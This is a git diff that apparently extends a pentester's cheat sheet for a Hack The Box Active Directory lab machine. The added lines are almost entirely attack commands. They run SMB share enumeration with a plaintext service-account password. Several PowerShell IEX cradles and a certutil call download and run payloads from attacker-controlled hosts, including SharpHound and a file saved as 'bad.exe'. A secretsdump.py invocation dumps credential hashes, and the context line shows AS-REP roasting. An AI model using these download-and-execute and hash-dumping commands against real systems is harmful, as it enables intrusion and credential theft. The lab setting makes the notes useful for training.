@@ -37,3 +37,33 @@ for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${us
 ```
 
 ## SMB Enum
+```
+Enum:
+
+smbmap -H 10.10.10.161 
+smbmap -H 10.10.10.161 -u svc-alfresco -p s3rvice -R IPC$
+
+Login:
+smbclient \\\\10.10.10.161\\IPC$ -U 'svc-alfresco%s3rvice'
+
+```
+
+## Windows
+### Download File with Powershell
+```
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1') (Download and run script)
+```
+
+
+## PE
+
+### BloodHound
+```
+certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1');Invoke-BloodHound (Just for .ps1)
+```
+
+### Dump Hash (Generetic PE)
+```
+secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+```
